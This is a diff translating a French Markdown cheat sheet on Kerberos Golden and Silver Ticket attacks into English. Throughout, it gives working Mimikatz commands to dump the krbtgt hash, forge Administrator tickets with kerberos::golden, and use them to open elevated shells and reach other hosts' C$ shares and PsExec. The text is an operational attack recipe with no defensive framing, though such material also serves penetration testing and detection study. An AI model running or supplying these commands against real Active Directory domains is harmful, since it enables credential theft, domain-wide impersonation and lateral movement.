@@ -1,34 +1,34 @@
-# Silver & Golden Tickets 
+# Silver & Golden Tickets
 
 [Mimikatz](Mimikatz.md)
 
-- Un ticket argent (silver) est limité au service ciblé.
-- Un ticket or (golden) a accès à n'importe quel service Kerberos.
+- A silver ticket is limited to the targeted service.
+- A golden ticket has access to any Kerberos service.
 
 ## Golden Tickets
 
-Vider le hachage krbtgt
+Dump the krbtgt hash
 
 ```sh
 lsadump::lsa /inject /name:krbtgt
-# Assurez-vous que cela génère: [privilège '20' ok]
+# Make sure this outputs: [privilege '20' ok]
 ```
 
-Créer un ticket d'or
+Create a golden ticket
 
 ```sh
 kerberos::golden /user:Administrator /domain:controller.local /sid:{krbtgt_SID} /krbtgt:{krbtgt_NTHASH} /id:500
 
-kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{SID} /krbtgt:{NTLM} /id:500
+kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:{SID} /krbtgt:{NTLM} /id:500
 
-# Assurez-vous que cela génère: Final Ticket Saved to file !
+# Make sure this outputs: Final Ticket Saved to file !
 ```
 
-Utilisez le ticket Golden pour accéder à d'autres machines
+Use the Golden ticket to access other machines
 
 ```sh
 misc::cmd
-# Cela ouvrira une nouvelle invite de commande avec des privilèges élevés sur toutes les machines
+# This will open a new command prompt with elevated privileges on all machines
 
 
 dir \\DESKTOP-1\c$
@@ -38,19 +38,19 @@ PsExec.exe \\DESKTOP-1 cmd.exe
 
 ## Silver Tickets
 
-Pour créer un ticket d'argent, placez simplement un hachage NTLM de service dans l'emplacement krbtgt, le SID du compte de service dans SID et modifiez l'ID en 1103.
+To create a silver ticket, simply put a service NTLM hash in the krbtgt location, the service account SID in SID, and change the ID to 1103.
 
-Créer un ticket d'or/d'argent
+Create a golden/silver ticket
 
 ```sh
 kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:1103
 ```
 
-Utilisez le ticket Silver pour accéder au service
+Use the Silver ticket to access the service
 
 ```sh
 misc::cmd
-# Cela ouvrira une nouvelle invite de commande élevée avec le ticket donné dans mimikatz
+# This will open a new elevated command prompt with the given ticket in mimikatz
 
 dir \\DESKTOP-1\c$
 ```
